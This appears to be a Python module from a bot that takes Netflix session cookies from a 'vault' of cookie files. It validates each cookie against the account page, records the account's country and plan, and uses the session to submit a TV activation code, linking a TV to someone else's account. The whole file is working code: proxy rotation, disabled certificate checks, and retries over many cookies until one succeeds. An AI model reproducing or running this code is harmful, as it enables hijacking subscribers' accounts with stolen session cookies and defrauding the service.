"""
Netflix TV Login module.
Validates cookies, submits TV codes, and handles proxy support.
Ported from TVBot.py.
"""

import os
import re
import random
import logging
import urllib.parse

import requests
from urllib3.exceptions import InsecureRequestWarning

import config
from .netflix_cookie_extractor import extract_cookie_dict
from .tv_vault import get_random_cookie_file, count_vault_cookies

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

logger = logging.getLogger(__name__)

USER_AGENT = config.USER_AGENT
REQUEST_TIMEOUT = config.REQUEST_TIMEOUT


def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, re.IGNORECASE)
    if m:
        d = m.groupdict()
        host = d["host"].strip().strip("[]")
        url = f"{d['scheme']}://{d['user']}:{d['password']}@{host}:{d['port']}" if d.get("user") else f"{d['scheme']}://{host}:{d['port']}"
        return {"http": url, "https": url}
    m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['host']}:{d['port']}", "https": f"http://{d['host']}:{d['port']}"}
    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit() and not d.isdigit():
            return {"http": f"http://{c}:{d}@{a}:{b}", "https": f"http://{c}:{d}@{a}:{b}"}
        if d.isdigit() and not b.isdigit():
            return {"http": f"http://{a}:{b}@{c}:{d}", "https": f"http://{a}:{b}@{c}:{d}"}
    for sep in (r"\s+", r"\|", r";", r","):
        m = re.match(rf"^(?P<host>[^:\s]+):(?P<port>\d+){sep}(?P<user>[^:\s]+):(?P<password>\S+)$", line)
        if m:
            d = m.groupdict()
            return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    return None


def load_proxies():
    proxies = []
    proxy_file = config.PROXY_FILE
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    proxies.append(p)
    return proxies


# Load proxies at module init
proxies_list = load_proxies()


def validate_cookie(cookies, proxy=None):
    """Validate a Netflix cookie by checking account membership page."""
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
        )
        if r.status_code != 200:
            return False, None, None
        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if not country:
            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text)
        if not country:
            return False, None, None
        plan = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', r.text)
        return True, country.group(1), plan.group(1) if plan else "Unknown"
    except Exception:
        return False, None, None


TV_CODE_ERROR_PATTERNS = [
    r"that code wasn'?t right",
    r"code (is )?(incorrect|invalid|wrong)",
    r"try again",
    r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no",
    r"int[ée]ntalo de nuevo",
    r"intenta (de )?nuevo",
    r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
    r"esse c[oó]digo n[aã]o",
    r"tente novamente",
    r"code (est |n'est pas |incorrect|invalide)",
    r"ce code n'est",
    r"r[ée]essayez",
    r"essayez encore",
    r"code (ist |ung[uü]ltig|falsch)",
    r"versuchen sie es erneut",
    r"codice (non [eè] |sbagliato|non valido)",
    r"riprova",
    r"kod (yanlış|ge[çc]ersiz|hatalı|doğru değil)",
    r"tekrar dene",
    r"الرمز (غير صحيح|خطأ|خاطئ)",
    r"حاول مرة أخرى",
    r"הקוד (שהזנת |שגוי|לא נכון)",
    r"כדאי לנסות שוב",
    r"m[ãa] (đó|không đúng|không ch[íi]nh x[áa]c|sai)",
    r"thử lại",
    r"kod (jest |nieprawidłowy|błędny)",
    r"spr[óo]buj ponownie",
    r"код (неверный|неправильный|ошибочный)",
    r"попробуйте",
    r"代码(有误|错误|无效|不正确)",
    r"请重试",
    r"再试一[次遍]",
    r"代碼(有誤|錯誤|無效|不正確)",
    r"請重試",
    r"再試一[次遍]",
    r"kode (salah|tidak valid|tidak tepat)",
    r"coba lagi",
    r"รหัส(ที่คุณป้อน)?(ไม่ถูกต้อง|ผิด)",
    r"ลองอีกครั้ง",
    r"코드(가|는)?(잘못|틀렸|올바르지 않)",
    r"다시 시도",
    r"コード(が|は)?(間違|違|正しく)",
    r"もう一度",
    r"कोड (गलत|अमान्य)",
    r"पुनः प्रयास",
    r"फिर से",
    r"code (is |niet |onjuist|verkeerd)",
    r"probeer opnieuw",
    r"codul (este |nu este |incorect|gre[sș]it)",
    r"[iî]ncearc[aă] din nou",
    r"a k[oó]d (hib[aá]s|nem megfelel)",
    r"pr[oó]b[aá]ld [uú]jra",
    r"ο κωδικ[οό]ς (είναι |δεν είναι |λάθος|εσφαλμέν)",
    r"δοκιμ[άα]στε ξαν[άα]",
    r"koden (är |stämmer inte |felaktig|ogiltig)",
    r"f[oö]rs[oö]k igen",
    r"koden (er |stemmer ikke |feil|ugyldig)",
    r"pr[oø]v igjen",
    r"koden (er |er ikke |forkert|ugyldig)",
    r"pr[oø]v igen",
    r"koodi (on |ei ole |virheellinen|v[aä][aä]r[aä])",
    r"yrit[aä] uudelleen",
    r"k[oó]d (je |nen[íi] |nespr[aá]vn[yý]|chybn[yý])",
    r"zkuste to znovu",
    r"код (нев[іи]рний|неправильний|помилковий)",
    r"спробуйте (ще раз|знову)",
]


def is_tv_code_error(cleaned_text):
    text_lower = cleaned_text.lower()
    for pattern in TV_CODE_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            return True
    return False


def is_tv_code_success(final_url, cleaned_text):
    if "/tv/out/success" in final_url.lower():
        return True
    success_patterns = [
        r"tu tv est[aá] lista",
        r"your tv is ready",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"הטלוויזיה שלך מוכנ",
        r"تلفازك جاهز",
        r"tv của bạn đã sẵn sàng",
        r"tw[oó]j telewizor jest gotowy",
    ]
    for pat in success_patterns:
        if re.search(pat, cleaned_text.lower()):
            return True
    return False


def extract_auth_url(html):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None


def submit_tv_code(session, tv_code, proxy=None):
    """Submit an 8-digit TV code using the authenticated session."""
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception:
        return {"success": False, "error": "Connection failed"}

    auth_url = extract_auth_url(r.text)
    if not auth_url:
        fallback = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fallback:
            auth_url = fallback.group(0)
        else:
            return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }

    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
        )
    except Exception:
        return {"success": False, "error": "Activation request failed"}

    final_url = r.url if hasattr(r, 'url') else url

    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}

    import html as html_mod
    text = r.text
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = html_mod.unescape(text)
    text = re.sub(r'\s+', ' ', text).strip()

    if is_tv_code_error(text):
        return {"success": False, "error": "Invalid or expired TV code"}

    if is_tv_code_success(final_url, text):
        return {"success": True, "error": None}

    return {"success": False, "error": "Unknown response from Netflix"}


def process_tv_login(tv_code):
    """
    Try vault cookies one by one until one successfully activates the TV code.
    Returns dict with success status, country, plan, error info.
    """
    proxies = proxies_list
    max_attempts = min(config.TV_MAX_ATTEMPTS, max(count_vault_cookies(), config.TV_MAX_ATTEMPTS))
    attempts = 0

    while attempts < max_attempts:
        attempts += 1

        filename, content = get_random_cookie_file()
        if not filename or not content:
            return {"success": False, "error": "no_cookies"}

        cookies = extract_cookie_dict(content)
        if not cookies:
            continue

        proxy = random.choice(proxies) if proxies else None
        valid, country, plan = validate_cookie(cookies, proxy)

        if not valid:
            continue

        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)

        result["country"] = country
        result["plan"] = plan
        result["cookie_file"] = filename

        return result

    return {"success": False, "error": "all_dead"}
